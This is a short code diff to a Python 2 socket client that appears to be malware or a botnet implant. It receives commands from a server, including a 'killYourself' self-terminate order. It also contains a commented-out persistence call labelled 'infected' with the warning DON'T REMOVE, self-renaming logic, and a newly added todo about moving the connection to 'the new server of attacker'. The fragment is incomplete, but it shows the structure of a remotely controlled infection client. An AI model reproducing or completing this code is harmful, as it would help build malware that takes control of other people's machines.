@@ -30,6 +30,8 @@ def threaded_function(soc):
         try:
             soc.send("1")
             sleep(TIMEOUT)
+            # todo added check if the new server of attacker, and then change owr socket to the new server
+
         except Exception as e:
             un_success += 1
             print 'un_success', un_success
@@ -83,9 +85,6 @@ class Handle():
         except Exception as e:
             print e.message
             return
-        if d.WhichOneof("Msg") == "clientReq":
-            print '\r[from server] name:', d.clientReq.name
-            print 'id:', d.clientReq.id
         if d.WhichOneof("Msg") == 'serverReq':
             if d.serverReq.WhichOneof("Type") == 'killYourself':
                 self.terminate(d.serverReq.killYourself.status)
@@ -164,8 +163,8 @@ def main():
         # persistent('infected', os.path.abspath(__file__))  # DON'T REMOVE
 
         # rename me to client.py
-        os.rename(__file__, os.getcwd() + "/client.py")
-
+        # os.rename(__file__, os.getcwd() + "/client1.py")
+        # print os.path.abspath(__file__)
         global my_socket
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         my_socket.connect((SERVER_ADDRESS, PORT))
